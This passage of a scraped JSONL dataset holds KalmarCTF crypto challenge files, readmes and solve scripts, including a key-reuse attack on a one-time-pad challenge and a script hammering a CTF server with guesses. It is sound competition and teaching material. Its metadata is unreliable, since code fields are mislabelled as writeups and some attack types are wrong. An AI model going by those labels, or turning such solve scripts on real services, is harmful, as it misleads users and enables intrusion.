ob, oc, od, oe, of = other.extract()\n        a = (sa + sb * oa + sd * oc) % 3\n        b = (sb * ob + sd * oe) % 3\n        c = (sc + se * oa + sf * oc) % 3\n        d = (sb * od + sd * of) % 3\n        e = (se * ob + sf * oe) % 3\n        f = (se * od + sf * of) % 3\n        return Value.assemble(a, b, c, d, e, f)\n\n    def __str__(self):\n        return str(self.n)\n\n    def __repr__(self):\n        return repr(self.n)\n\nclass DreamHash:\n    def __init__(self):\n        # I read that it is important to use nothing-up-my-sleeves-numbers for\n        # constants in cryptosystems, so I generate the template randomly.\n        self.template = [\n                random.sample(\n                    sum([[(i+j) % BLOCKSIZE]*(1 if j == 0 else j*VALUESIZE)\n                         for j in range(BLOCKSIZE)], []),\n                    k=(1 + VALUESIZE * sum(range(BLOCKSIZE)))\n                    )\n                for i in range(BLOCKSIZE)\n                ]\n\n    def hash(self, data):\n        unfolded_data = [Value(d) for d in data]\n        unfolded_data += [Value(0)] * (BLOCKSIZE - (len(unfolded_data) % BLOCKSIZE))\n        folded_data = [sum(unfolded_data[i::BLOCKSIZE], Value(0)) for i in range(BLOCKSIZE)]\n        result = []\n        for i in range(BLOCKSIZE):\n            result.append(Value(0))\n            for j in self.template[i]:\n                result[-1] += folded_data[j]\n        return [x.n for x in result]\n\ndef main():\n    print('Welcome to the DreamHash testing service.')\n    H = DreamHash()\n    secret = bytes([random.randrange(VALUESIZE) for _ in range(BLOCKSIZE)])\n    print('I generated a secret. Can you recover it?')\n    for _ in range(4):\n        try:\n            user_bytes = base64.b64decode(input('Your values: '))\n            h = H.hash(secret + user_bytes)\n            print(f'Hash: {base64.b64encode(bytes(h)).decode()}')\n        except:\n            exit(0)\n    user_bytes = base64.b64decode(input('Your guess at secret: '))\n    if user_bytes == secret:\n        with open('flag.txt', 'r') as f:\n            print(f.read())\n    else:\n        print('Wrong.\\n')\n\n\nif __name__ == '__main__':\n    main()\n", "solution_code": "    def __init__(self, n):\n        if isinstance(n, Value):\n            n = n.n\n        if not (isinstance(n, int) and 0 <= n <= VALUESIZE):\n            raise ValueError\n        self.n = n\n\n\n    def __eq__(self, other):\n        return self.n == other.n\n\n\n    def extract(self):\n        a = self.n % 3\n        b = ((self.n // 27) + 1) % 3\n        c = (self.n // 9) % 3\n        d = (((self.n // 27) + 1) // 3) % 3\n        if b == 0:\n            f = (self.n // 3) % 3\n            e = (2 * d) % 3\n        else:\n            e = (self.n // 3) % 3\n            f = ((1 + d*e) * b) % 3\n        return a,b,c,d,e,f\n\n\n    @classmethod\n    def assemble(cls, a, b, c, d, e, f):\n        for x in (a,b,c,d,e,f):\n            if not (isinstance(x, int) and 0 <= x <= 2):\n                raise ValueError\n        n = 0\n        n += a\n        n += 27 * ((b + 3 * d) - 1)\n        n += 9 * c\n        if b == 0:\n            n += 3 * f\n        else:\n            n += 3 * e\n        return Value(n)\n\n\n    def __add__(self, other):\n        sa, sb, sc, sd, se, sf = self.extract()\n        oa, ob, oc, od, oe, of = other.extract()\n        a = (sa + sb * oa + sd * oc) % 3\n        b = (sb * ob + sd * oe) % 3\n        c = (sc + se * oa + sf * oc) % 3\n        d = (sb * od + sd * of) % 3\n        e = (se * ob + sf * oe) % 3\n        f = (se * od + sf * of) % 3\n        return Value.assemble(a, b, c, d, e, f)\n\n\n    def __str__(self):\n        return str(self.n)\n\n\n    def __repr__(self):\n        return repr(self.n)\n\n\n    def __init__(self):\n        # I read that it is important to use nothing-up-my-sleeves-numbers for\n        # constants in cryptosystems, so I generate the template randomly.\n        self.template = [\n                random.sample(\n                    sum([[(i+j) % BLOCKSIZE]*(1 if j == 0 else j*VALUESIZE)\n                         for j in range(BLOCKSIZE)], []),\n                    k=(1 + VALUESIZE * sum(range(BLOCKSIZE)))\n                    )\n                for i in range(BLOCKSIZE)\n                ]\n\n\n    def hash(self, data):\n        unfolded_data = [Value(d) for d in data]\n        unfolded_data += [Value(0)] * (BLOCKSIZE - (len(unfolded_data) % BLOCKSIZE))\n        folded_data = [sum(unfolded_data[i::BLOCKSIZE], Value(0)) for i in range(BLOCKSIZE)]\n        result = []\n        for i in range(BLOCKSIZE):\n            result.append(Value(0))\n            for j in self.template[i]:\n                result[-1] += folded_data[j]\n        return [x.n for x in result]\n\n\n    print('Welcome to the DreamHash testing service.')\n    H = DreamHash()\n    secret = bytes([random.randrange(VALUESIZE) for _ in range(BLOCKSIZE)])\n    print('I generated a secret. Can you recover it?')\n    for _ in range(4):\n        try:\n            user_bytes = base64.b64decode(input('Your values: '))\n            h = H.hash(secret + user_bytes)\n            print(f'Hash: {base64.b64encode(bytes(h)).decode()}')\n        except:\n            exit(0)\n    user_bytes = base64.b64decode(input('Your guess at secret: '))\n    if user_bytes == secret:\n        with open('flag.txt', 'r') as f:\n            print(f.read())\n    else:\n        print('Wrong.\\n')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\DreamHash\\internal_hosting\\src\\challenge.py", "file_size": 3279, "scraped_at": "2025-10-26T18:19:59.273110"}
{"id": "kalmar_kalmarctf_challenge_file", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "challenge file", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\nimport os\n\nPASS_LENGTH_BYTES = 128\n\ndef encrypt_otp(cleartext, key = os.urandom(PASS_LENGTH_BYTES)):\n    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])\n    return ciphertext, key\n\n\nif __name__ == '__main__':\n    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "solution_code": "    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\BabyOneTimePad\\public\\challenge_file.py", "file_size": 1690, "scraped_at": "2025-10-26T18:19:59.286720"}
{"id": "kalmar_kalmarctf_\"BabyOneTimePad\"_challenge_for_KalmarCTF_2023", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "\"BabyOneTimePad\" challenge for KalmarCTF 2023", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\n# \"BabyOneTimePad\" challenge for KalmarCTF 2023\n# based on \"EasyOneTimePad\"\n# original challenge by shalaamum\n# idea to make this easier variant by killerdog\n\nimport os\n\nPASS_LENGTH_BYTES = 128\n\ndef encrypt_otp(cleartext, key = os.urandom(PASS_LENGTH_BYTES)):\n    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])\n    return ciphertext, key\n\n\nif __name__ == '__main__':\n    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "solution_code": "    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\BabyOneTimePad\\solution\\challenge.py", "file_size": 1849, "scraped_at": "2025-10-26T18:19:59.300062"}
{"id": "kalmar_kalmarctf_Writeup_Solve_script_for_\"BabyOneTimePad\"_for_KalmarCTF_2023", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "Writeup/Solve script for \"BabyOneTimePad\" for KalmarCTF 2023", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\n# Writeup/Solve script for \"BabyOneTimePad\" for KalmarCTF 2023\n# by shalaamum\n\n# This challenge was based on the original \"EasyOneTimePad\", and intended as an\n# easier variant, by actually reusing the key in both encryptions, by using how\n# default arguments work in Python. The idea for this change was by killerdog.\n# Another difference in the released versions of BabyOneTimePad and\n# EasyOneTimePad was the missing assert on the length of the permutation\n# supplied by the user, but that was an unintended mistake that we fixed before\n# releasing EasyOneTimePad. This solution uses a legitimate permutation and\n# only uses that the same key is used in both encryptions.\n\nimport itertools\nimport functools\nimport pwnlib.tubes.process\nimport pwnlib.tubes.remote\nfrom challenge import PASS_LENGTH_BYTES\n\n# We will use n for PASS_LENGTH_BYTES.\n# Let us denote the bytes of the password by P_0, P_1, ..., P_{n-1}.  As\n# encryption first converts to hex we will let p'_i and p_i be the two bytes of\n# the hexstring corresponding to P_i (where p'_i corresponds to the most\n# significant four bits). \n# If we denote the random bytes by r_0, ..., r_{n-1}, then the first encryption\n# will return\n# r_0 ^ p'_0, r_1 ^ p_0, ...., r_{n-2} ^ p'_{n/2 - 1}, r_{n-1} ^ p_{n/2 - 1},\n# r_0 ^ p'_{n/2}, ..., r_{n-1} ^ p_{n-1}\n# As permutation we will use n-1, 0, 1, ..., n-2. The second encryption will\n# then return\n# r_0 ^ p'_{n-1}, r_1 ^ p_{n-1}, r_2 ^ p'_0, r_3 ^ p_0, ...\n# What we can do now is guess r_0 and r_1. Then from the first encryption we\n# will be able to obtain p'_0 and p_0 by looking at the first two bytes. Moving\n# on to the second encryption we will in turn be able to use that to extract\n# r_2 and r_3 by looking at the third and fourth byte. Continuing like this we\n# can deduce the entire key. This only requires first half of the ciphertexts\n# (plus two bytes of the second due to the permutation). We could continue\n# directly with the second halves for consistency checks to rule out keys, but\n# this is not necessary. We can just try to decrypt both cipertexts with the\n# obtained key and check whether we get the same, and that only the characters\n# 'a' to 'f' and '0' to '9' appear.  It is very unlikely that this will happen\n# for keys that are not the correct one.\n\n\n# This function extracts the full key in the manner described above based on\n# the two ciphertexts as well as a guess for the first two bytes of the key\ndef full_key_from_first_two_bytes(enc_id, enc_perm, first_key_byte, second_key_byte):\n    key = bytes([first_key_byte, second_key_byte])\n    cleartext_hex = b''\n    for i in range((PASS_LENGTH_BYTES // 2) - 1):\n        cleartext_hex += bytes([enc_id[2*i] ^ key[2*i]])\n        cleartext_hex += bytes([enc_id[2*i + 1] ^ key[2*i + 1]])\n        key += bytes([enc_perm[2*i + 2] ^ cleartext_hex[2*i]])\n        key += bytes([enc_perm[2*i + 3] ^ cleartext_hex[2*i + 1]])\n    return key\n\ndef decrypt(key, enc):\n    cleartext = bytes([key[i % len(key)] ^ x for i,x in enumerate(enc)])\n    return cleartext\n\nremote = pwnlib.tubes.process.process('./challenge.py')\n#remote = pwnlib.tubes.remote.remote('3.120.132.103', 13337)\nremote.recvuntil(b'pad: ')\nenc_id = bytes.fromhex(remote.recvuntil(b'\\n').strip().decode())\npermutation = [PASS_LENGTH_BYTES - 1] + list(range(PASS_LENGTH_BYTES-1))\nto_send = ','.join([str(x) for x in permutation]).encode()\nremote.send(to_send + b'\\n')\nremote.recvuntil(b'pad: ')\nenc_perm = bytes.fromhex(remote.recvuntil(b'\\n').strip().decode())\n\ncleartex_hex = None\n# We bruteforce locally the first two bytes.\nfor first_key_byte, second_key_byte in itertools.product(range(256), repeat=2):\n    # For each guess we deduce what the full key would need to be.\n    key = full_key_from_first_two_bytes(enc_id, enc_perm, first_key_byte, second_key_byte)\n    # Then we decrypt the hex of the password from both ciphertexts\n    cleartext_from_id_hex = decrypt(key, enc_id)\n    cleartext_from_perm_hex = decrypt(key, enc_perm)\n    cleartext_from_perm_hex = cleartext_from_perm_hex[2:] + cleartext_from_perm_hex[:2]\n    # If we get something inconsistent, the guess was wrong.\n    if cleartext_from_perm_hex != cleartext_from_id_hex:\n        continue\n    cleartext_hex = cleartext_from_id_hex\n    # If we do not get only hex characters, the guess is also wrong.\n    if not all([x in '0123456789abcdef'.encode() for x in cleartext_hex]):\n        continue\n    break\nif cleartext_hex is None:\n    print('What happened?')\n    quit()\nremote.recvuntil(b'password: ')\nremote.send(cleartext_hex + b'\\n')\nprint(remote.recvline().strip().decode())\n", "solution_code": "    # For each guess we deduce what the full key would need to be.\n    key = full_key_from_first_two_bytes(enc_id, enc_perm, first_key_byte, second_key_byte)\n    # Then we decrypt the hex of the password from both ciphertexts\n    cleartext_from_id_hex = decrypt(key, enc_id)\n    cleartext_from_perm_hex = decrypt(key, enc_perm)\n    cleartext_from_perm_hex = cleartext_from_perm_hex[2:] + cleartext_from_perm_hex[:2]\n    # If we get something inconsistent, the guess was wrong.\n    if cleartext_from_perm_hex != cleartext_from_id_hex:\n        continue\n    cleartext_hex = cleartext_from_id_hex\n    # If we do not get only hex characters, the guess is also wrong.\n    if not all([x in '0123456789abcdef'.encode() for x in cleartext_hex]):\n        continue\n    break\n\n\n    print('What happened?')\n    quit()\n", "tools": ["python"], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\BabyOneTimePad\\solution\\solve.py", "file_size": 4606, "scraped_at": "2025-10-26T18:19:59.313301"}
{"id": "kalmar_kalmarctf_challenge", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "challenge", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\nimport os\n\nPASS_LENGTH_BYTES = 128\n\ndef encrypt_otp(cleartext, key = os.urandom(PASS_LENGTH_BYTES)):\n    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])\n    return ciphertext, key\n\n\nif __name__ == '__main__':\n    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "solution_code": "    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\BabyOneTimePad\\internal_hosting\\src\\challenge.py", "file_size": 1690, "scraped_at": "2025-10-26T18:19:59.314997"}
{"id": "kalmar_kalmarctf_\"Poly1305_is_a_universal_hash_family_designed_by_Daniel_J._Bernstein_for_use_in_cryptography.\"_-_wikipedia", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "\"Poly1305 is a universal hash family designed by Daniel J. Bernstein for use in cryptography.\" - wikipedia", "attack_type": "RSA", "writeup": "#!/usr/bin/env python3\n\nfrom Crypto.Hash import Poly1305\nfrom Crypto.Cipher import ChaCha20\nimport os\n\nN = 240\nS = 10\nL = 3\nI = 13\n\nwith open(\"flag.txt\", \"rb\") as f:\n    flag = f.read().strip()\n\n# \"Poly1305 is a universal hash family designed by Daniel J. Bernstein for use in cryptography.\" - wikipedia\ndef poly1305_hash(data, Key, Nonce):\n    hsh = Poly1305.new(key=Key, cipher=ChaCha20, nonce=Nonce)\n    hsh.update(data=data)\n    return hsh.digest()\n\n# If i just use a hash function instead of a linear function in my LCG, then it should be super secure right?\nclass PolyCG:\n    def __init__(self):\n        self.Key = os.urandom(32)\n        self.Nonce = os.urandom(8)\n        self.State = os.urandom(16)\n\n        # Oops.\n        print(\"init = '\" + poly1305_hash(b'init', self.Key, self.Nonce)[:I].hex() + \"'\")\n\n    def next(self):\n        out = self.State[S:S+L]\n        self.State = poly1305_hash(self.State, self.Key, self.Nonce)\n        return out\n\nif __name__ == \"__main__\":\n    pcg = PolyCG()\n    v = []\n    for i in range(N):\n        v.append(pcg.next().hex())\n    print(f'{v = }')\n\n    key = b\"\".join([pcg.next() for _ in range(0, 32, L)])[:32]\n    cipher = ChaCha20.new(key=key, nonce=b'\\0'*8)\n    flagenc = cipher.encrypt(flag)\n    print(f\"flagenc = '{flagenc.hex()}'\")\n", "solution_code": "    def __init__(self):\n        self.Key = os.urandom(32)\n        self.Nonce = os.urandom(8)\n        self.State = os.urandom(16)\n\n\n        # Oops.\n        print(\"init = '\" + poly1305_hash(b'init', self.Key, self.Nonce)[:I].hex() + \"'\")\n\n\n    def next(self):\n        out = self.State[S:S+L]\n        self.State = poly1305_hash(self.State, self.Key, self.Nonce)\n        return out\n\n\n    pcg = PolyCG()\n    v = []\n    for i in range(N):\n        v.append(pcg.next().hex())\n    print(f'{v = }')\n\n\n    key = b\"\".join([pcg.next() for _ in range(0, 32, L)])[:32]\n    cipher = ChaCha20.new(key=key, nonce=b'\\0'*8)\n    flagenc = cipher.encrypt(flag)\n    print(f\"flagenc = '{flagenc.hex()}'\")\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2024\\crypto\\PolyCG1305\\chal.py", "file_size": 1282, "scraped_at": "2025-10-26T18:19:59.326428"}
{"id": "kalmar_kalmarctf_script_to_use_flatter_from_python", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "script to use flatter from python", "attack_type": "RSA", "writeup": "#!/usr/bin/env python3\n\n# script to use flatter from python\n# by shalaamum\n\nimport subprocess\n\ndef reduce_flatter(lattice):\n    data = '['\n    data += '\\n'.join('[' + ' '.join(str(c) for c in vector) + ']' for vector in lattice)\n    data += ']\\n'\n    result = []\n    print('starting flatter...')\n    with subprocess.Popen(['flatter', '-v'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True) as p:\n        p.stdin.write(data)\n        p.stdin.close()\n        #stdout = p.communicate(input=data)\n        #print(stdout)\n        for line in p.stdout:\n            if line[0] == '[':\n                result.append([int(x) for x in line.strip().replace('[','').replace(']','').split(' ')])\n            elif line[0] == ']':\n                pass\n            else:\n                print(line.rstrip())\n        p.wait()\n    print(f'flatter finished!')\n    return result\n", "solution_code": "    data = '['\n    data += '\\n'.join('[' + ' '.join(str(c) for c in vector) + ']' for vector in lattice)\n    data += ']\\n'\n    result = []\n    print('starting flatter...')\n    with subprocess.Popen(['flatter', '-v'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True) as p:\n        p.stdin.write(data)\n        p.stdin.close()\n        #stdout = p.communicate(input=data)\n        #print(stdout)\n        for line in p.stdout:\n            if line[0] == '[':\n                result.append([int(x) for x in line.strip().replace('[','').replace(']','').split(' ')])\n            elif line[0] == ']':\n                pass\n            else:\n                print(line.rstrip())\n        p.wait()\n    print(f'flatter finished!')\n    return result\n", "tools": ["python"], "file_path": "temp_repos\\kalmar_kalmarctf\\2024\\crypto\\PolyCG1305\\solution\\lattice.py", "file_size": 917, "scraped_at": "2025-10-26T18:19:59.350757"}
{"id": "kalmar_kalmarctf_solve", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "solve", "attack_type": "Unknown", "writeup": "from pwn import *\n\nwith open(\"words.txt\", \"r\") as f:\n    words = [w.strip() for w in f.readlines()]\nassert len(words) == 2048\n\nprint(\"Loading table...\")\ntable = {}\nwith open(\"table.txt\", \"r\") as f:\n    for l in f:\n        if not l.strip():\n            continue\n        letters, indexes = l.strip().split(\":\")\n        indexes = [int(x) for x in indexes.split(\",\")]\n        table[letters] = indexes\n\nprint(\"Connecting...\")\nwhile True:\n    with remote(\"short-circuit.chal-kalmarc.tf\", 1337) as io:\n        io.recvuntil(b\"(hint: \")\n        hint_line = io.recvline().decode()\n        hint_letters = \"\".join(w[0] for w in hint_line.split(\" \")[:5])\n        if hint_letters not in table:\n            continue\n        answer = \" \".join(words[i] for i in table[hint_letters])\n        print(hint_letters, answer)\n        io.recvuntil(b\"> \")\n        io.sendline(answer.encode())\n        resp = io.recvline()\n        if resp != b\"Nope!\\n\":\n            print(resp)\n            break\n", "solution_code": "    with remote(\"short-circuit.chal-kalmarc.tf\", 1337) as io:\n        io.recvuntil(b\"(hint: \")\n        hint_line = io.recvline().decode()\n        hint_letters = \"\".join(w[0] for w in hint_line.split(\" \")[:5])\n        if hint_letters not in table:\n            continue\n        answer = \" \".join(words[i] for i in table[hint_letters])\n        print(hint_letters, answer)\n        io.recvuntil(b\"> \")\n        io.sendline(answer.encode())\n        resp = io.recvline()\n        if resp != b\"Nope!\\n\":\n            print(resp)\n            break\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2025\\crypto\\short-circuit\\solution\\solve.py", "file_size": 969, "scraped_at": "2025-10-26T18:19:59.362251"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Challenge based on EasyOneTimePad by shalaamum, idea for this easier variant by killerdog\n\nChallenge name: BabyOneTimePad\nCategory: Crypto\nNumber of solves: 124\n\nCTFd_description:\n```\nI read about how encryption with one-time pads is unbreakable, so no one will be able to solve this challenge.\n\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in ./public/\nFiles used to compile and host the challenge are in ./internal_hosting/\nA combined writeup and solution script is in ./solution/\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\BabyOneTimePad\\readme.txt", "file_size": 524, "scraped_at": "2025-10-26T18:19:59.372051"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Challenge written by https://github.com/rot256, solve script and testing by killerdog and Shalaamum\n\nChallenge name: Blind Security\nCategory: Crypto\nNumber of solves: 1\n\nCTFd_description:\n```\nThat feeling when you're sitting in the audience at your first eurocrypt, enjoying the best paper talk, and suddenly realise the speaker has broken a provably secure protocol you have implemented on your github :psyduck:\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in /public\nFiles used to compile and host the challenge are in /internal_hosting\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\Blind_security\\readme.txt", "file_size": 580, "scraped_at": "2025-10-26T18:19:59.387392"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Challenge by shalaamum\n\nChallenge name: DreamHash\nCategory: Crypto\nNumber of solves: 8\n\nCTFd_description:\n```\nI fell asleep in my abstract algebra class and dreamt of this weird hash function, so I decided to make a challenge with it. Can you solve it?\n\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in ./public/\nFiles used to compile and host the challenge are in ./internal_hosting/\nA combined writeup and solution script is in ./solution/\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\DreamHash\\readme.txt", "file_size": 482, "scraped_at": "2025-10-26T18:19:59.397848"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Challenge by shalaamum\n\nChallenge name: EasyOneTimePad\nCategory: Crypto\nNumber of solves: 71\n\nCTFd_description:\n```\nI fixed the mistake from last time, now it should be secure - right?\n\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in ./public/\nFiles used to compile and host the challenge are in ./internal_hosting/\nA combined writeup and solution script is in ./solution/\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\EasyOneTimePad\\readme.txt", "file_size": 414, "scraped_at": "2025-10-26T18:19:59.406873"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Challenge written by https://github.com/Jonathke, some testing by killerdog\n\nChallenge name: l33t_generator\nCategory: Crypto\nNumber of solves: 6\n\nCTFd_description:\n```\nI'll let you choose the curve if I can choose the generator 8). No choosing weak curves though!\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in /public\nFiles used to compile and host the challenge are in /internal_hosting\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\l33t_generator\\readme.txt", "file_size": 431, "scraped_at": "2025-10-26T18:19:59.421705"}
